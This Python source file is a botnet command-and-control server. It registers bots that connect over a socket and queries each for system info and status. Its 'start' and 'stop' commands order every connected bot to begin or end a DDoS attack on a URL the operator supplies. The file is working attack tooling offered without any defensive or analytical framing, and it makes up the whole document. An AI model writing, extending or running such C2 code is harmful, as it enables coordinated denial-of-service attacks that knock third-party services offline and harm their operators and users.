import http.client
import requests
import socket
import json
import threading

from termcolor import colored, cprint


# TODO save online bots IPs on a file on closing and add them to cnc on startup

class CnC:
    """
    Command & Control center of the botnet.
    """

    def __init__(self, host: str, port: int):
        self.__address = (host, port)
        self.__bots = {}
        self.__cmds = {
            'help': {'fun': self.__commands, 'desc': self.__commands.__doc__, 'args': 0},
            'bots': {'fun': self.__list_clients, 'desc': self.__commands.__doc__, 'args': 0},
            'info': {'fun': self.__get_info, 'desc': self.__get_info.__doc__, 'args': 1},
            'status': {'fun': self.__status, 'desc': self.__status.__doc__, 'args': 1},
            'start': {'fun': self.__start, 'desc': self.__start.__doc__, 'args': 1},
            'stop': {'fun': self.__stop, 'desc': self.__stop.__doc__, 'args': 0},
            'exit': {'fun': self.__exit, 'desc': self.__exit.__doc__, 'args': 0}
        }
        self.__lock = threading.Lock()  # lock for thread-safe access to attributes

        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__socket.bind(self.__address)
        self.__socket.listen(10)
        self.__socket.settimeout(3)

    def __bot_connection(self, stop: threading.Event):

        while not stop.is_set():
            try:
                client, address = self.__socket.accept()
            except socket.timeout:
                continue

            address = address[0]

            with self.__lock:
                if address in self.__bots.keys():
                    try:
                        self.__bots.pop(address)
                        # print(f"bot {address} removed")
                    except ValueError:
                        print(f"{address} not in bot list")
                else:
                    self.__bots[address] = int(client.recv(1024).decode("utf-8"))
                    # print(f"bot {address} added")
            client.close()

    def __commands(self) -> str:
        """
        Lists all the commands.
        """
        return "\n\t- " + "\n\t- ".join(
            f"{cmd}: {self.__cmds[cmd]['desc']}" for cmd in self.__cmds.keys())

    def __list_clients(self) -> str:
        """
        Lists the bots that are connected to the botnet.
        """
        with self.__lock:
            if self.__bots:
                res = ""
                for addr, port in self.__bots.items():
                    try:
                        response = requests.get(f"http://{addr}:{port}/status")
                        status = json.loads(response.text)
                        res += f"\t- IP:\t{addr}\n\t  Port:\t{port}\n\t  CONNECTED\n\t  Action:\t{status['action']}\n" \
                               f"\t  Targets:\t{status['targets']}\n "
                    except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError):
                        res += f"\t- IP:\t{addr}\n\t  Port:\t{port}\n\t  DISCONNECTED"
                return "Bots connected:\n" + res
            return colored("No bots connected.", 'red')

    def __get_info(self, addresses) -> str:
        """
        Get information about the software and hardware configuration of a specific bot given his IP address.
        """
        with self.__lock:
            if not self.__bots:
                return colored("No bots connected.", 'red')

            address = addresses[0]

            if address not in self.__bots.keys():
                return colored("This address does not belong to any connected bot.", 'red')

            try:
                response = requests.get(f"http://{address}:{self.__bots[address]}/info")
            except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError) as e:
                return colored(e, 'red')

            res = f"System info of bot {address}:\n"
            for k, v in json.loads(response.text).items():
                res += f"\t- {k}: {v}\n"
            return res

    def __status(self, addresses):
        """
        Check the status of a specific bot given his IP address.
        """
        with self.__lock:
            if not self.__bots:
                return colored("No bots connected.", 'red')

            address = addresses[0]

            if address not in self.__bots.keys():
                return colored("This address does not belong to any connected bot.", 'red')

            try:
                response = requests.get(f"http://{address}:{self.__bots[address]}/status")
            except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError) as e:
                return colored(e, 'red')

            res = f"Status of bot {address}:\n"
            for k, v in json.loads(response.text).items():
                res += f"\t- {k}: {v}\n"
            return res

    def __start(self, urls):
        """
        Start a DDoS attack to the specified url.
        """
        url = urls[0]
        with self.__lock:
            if len(self.__bots) == 0:
                return colored("No bot connected.", 'red')
            responses = {
                requests.post(f"http://{address}:{port}/start", json={'url': url}).status_code
                for address, port in self.__bots.items()
            }
            if len(responses) == 1 and responses.pop() != 200:
                return colored("Attack did not start...", "red")
        return colored("Attack started successfully!", "green")

    def __stop(self):
        """
        Stop the running DDoS attack.
        """
        with self.__lock:
            if len(self.__bots) == 0:
                return colored("No bot connected.", 'red')
            responses = {
                requests.get(f"http://{address}:{port}/stop").status_code
                for address, port in self.__bots.items()
            }
            if len(responses) == 1 and responses.pop() != 200:
                return colored("Attack did not stop...", "red")
        return colored("Attack stopped successfully!", "green")

    def __exit(self) -> str:
        """
        Close the botnet.
        """
        return colored("Closing program...", "red")

    def cli(self):

        stop = threading.Event()
        bot_conn = threading.Thread(target=CnC.__bot_connection, args=(cnc, stop))
        bot_conn.start()
        cprint("Botnet started...", "green")

        cmd = 0

        while cmd != "exit":
            cprint("\n('help' to view the commands list).", 'yellow')
            cmd = str.lower(input("\n> "))
            result = self.__run_cmd(cmd)
            print(result)

        stop.set()  # stop the socket thread

    def __run_cmd(self, line):  # TODO implement more than one argument
        try:
            if ' ' in line:
                cmd, args = line.split(' ', 1)
                args = args.split(' ')
                if self.__cmds[cmd]['args'] > len(args):
                    return colored("Too few arguments.", 'red')
                elif self.__cmds[cmd]['args'] < len(args):
                    return colored("Too many arguments.", 'red')
                else:
                    return self.__cmds[cmd]['fun'](args)
            else:
                cmd = line
                if self.__cmds[cmd]['args'] > 0:
                    return colored("Too few arguments.", 'red')
                else:
                    return self.__cmds[cmd]['fun']()
        except KeyError:
            return colored("Command not recognized.", 'red')


HOST = '127.0.0.1'
PORT = 60000

if __name__ == '__main__':
    cnc = CnC(HOST, PORT)
    cnc.cli()
